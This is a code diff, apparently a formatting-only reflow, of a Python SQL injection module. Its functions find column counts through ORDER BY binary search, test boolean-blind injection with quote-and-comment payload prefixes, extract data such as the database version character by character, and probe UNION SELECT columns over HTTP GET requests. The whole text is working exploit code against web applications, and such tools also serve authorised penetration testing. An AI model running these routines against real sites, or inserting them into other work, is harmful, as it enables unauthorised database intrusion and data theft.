@@ -6,9 +6,15 @@ from tools.log_utils import get_logger
 logger = get_logger("binary_search")
 
 
-def binary_search_columns(url: str, param: str, sess, timeout: float = 10.0,
-                           max_columns: int = 50) -> Dict:
-    result: Dict[str, Any] = {"vulnerable": False, "column_count": None, "method": "order_by_binary", "evidence": []}
+def binary_search_columns(
+    url: str, param: str, sess, timeout: float = 10.0, max_columns: int = 50
+) -> Dict:
+    result: Dict[str, Any] = {
+        "vulnerable": False,
+        "column_count": None,
+        "method": "order_by_binary",
+        "evidence": [],
+    }
 
     low, high = 1, max_columns
     while low <= high:
@@ -21,7 +27,9 @@ def binary_search_columns(url: str, param: str, sess, timeout: float = 10.0,
                 result["evidence"].append({"tested": mid, "result": "ok", "status": 200})
             else:
                 high = mid - 1
-                result["evidence"].append({"tested": mid, "result": "fail", "status": r.status_code})
+                result["evidence"].append(
+                    {"tested": mid, "result": "fail", "status": r.status_code}
+                )
         except Exception as e:
             result["evidence"].append({"tested": mid, "result": "error", "error": str(e)})
             high = mid - 1
@@ -33,13 +41,25 @@ def binary_search_columns(url: str, param: str, sess, timeout: float = 10.0,
     return result
 
 
-def binary_search_sqli_blind(url: str, param: str, sess, timeout: float = 10.0,
-                               extract_len: int = 10) -> Dict:
-    result: Dict[str, Any] = {"vulnerable": False, "extracted": "", "method": "boolean_blind_binary", "evidence": []}
+def binary_search_sqli_blind(
+    url: str, param: str, sess, timeout: float = 10.0, extract_len: int = 10
+) -> Dict:
+    result: Dict[str, Any] = {
+        "vulnerable": False,
+        "extracted": "",
+        "method": "boolean_blind_binary",
+        "evidence": [],
+    }
 
     def _test_condition(condition: str) -> bool:
-        for prefix in ["' AND %s--", "' OR %s--", "\" AND %s--", "\" OR %s--",
-                        "1 AND %s--", "1 OR %s--"]:
+        for prefix in [
+            "' AND %s--",
+            "' OR %s--",
+            '" AND %s--',
+            '" OR %s--',
+            "1 AND %s--",
+            "1 OR %s--",
+        ]:
             payload = prefix % condition
             try:
                 r = sess.get(build_url(url, param, payload), timeout=timeout)
@@ -50,7 +70,7 @@ def binary_search_sqli_blind(url: str, param: str, sess, timeout: float = 10.0,
         return False
 
     if not _test_condition("1=1"):
-        for alt in ["1", "'1'='1", "\"a\"=\"a", "(SELECT 1)"]:
+        for alt in ["1", "'1'='1", '"a"="a', "(SELECT 1)"]:
             if _test_condition(alt):
                 break
         else:
@@ -91,8 +111,14 @@ def binary_search_sqli_blind(url: str, param: str, sess, timeout: float = 10.0,
                 break
         if extracted:
             result["extracted"] = extracted
-            result["evidence"].append({"query": q_template.split("(")[1].split(")")[0] if "(" in q_template else q_template,
-                                        "value": extracted})
+            result["evidence"].append(
+                {
+                    "query": q_template.split("(")[1].split(")")[0]
+                    if "(" in q_template
+                    else q_template,
+                    "value": extracted,
+                }
+            )
             break
 
     result["confidence"] = min(0.95, 0.5 + len(result["extracted"]) * 0.05)
@@ -100,7 +126,12 @@ def binary_search_sqli_blind(url: str, param: str, sess, timeout: float = 10.0,
 
 
 def blind_sqli_extract_data(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
-    result: Dict[str, Any] = {"vulnerable": False, "data": {}, "method": "blind_extract", "evidence": []}
+    result: Dict[str, Any] = {
+        "vulnerable": False,
+        "data": {},
+        "method": "blind_extract",
+        "evidence": [],
+    }
 
     queries = [
         ("version", "SELECT VERSION()"),
@@ -167,7 +198,13 @@ def _extract_char(query: str, pos: int, test_fn) -> Optional[str]:
 
 
 def sqli_union_probe(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
-    result = {"vulnerable": False, "columns": None, "usable_columns": [], "method": "union_probe", "evidence": []}
+    result = {
+        "vulnerable": False,
+        "columns": None,
+        "usable_columns": [],
+        "method": "union_probe",
+        "evidence": [],
+    }
     cols_result = binary_search_columns(url, param, sess, timeout)
     if not cols_result.get("vulnerable") or not cols_result.get("column_count"):
         return result
@@ -179,14 +216,16 @@ def sqli_union_probe(url: str, param: str, sess, timeout: float = 10.0) -> Dict:
         parts = nulls.split(", ")
         parts[test_col - 1] = "'EXTRACT_%d'" % test_col
         modified = ", ".join(parts)
-        for prefix in ["' UNION SELECT %s--", "\" UNION SELECT %s--", " UNION SELECT %s--"]:
+        for prefix in ["' UNION SELECT %s--", '" UNION SELECT %s--', " UNION SELECT %s--"]:
             payload = prefix % modified
             try:
                 r = sess.get(build_url(url, param, payload), timeout=timeout)
                 if r.status_code == 200 and "EXTRACT_%d" % test_col in r.text:
                     result["usable_columns"].append(test_col)
                     result["vulnerable"] = True
-                    result["evidence"].append({"column": test_col, "status": r.status_code, "method": "union"})
+                    result["evidence"].append(
+                        {"column": test_col, "status": r.status_code, "method": "union"}
+                    )
                     break
             except Exception:
                 continue
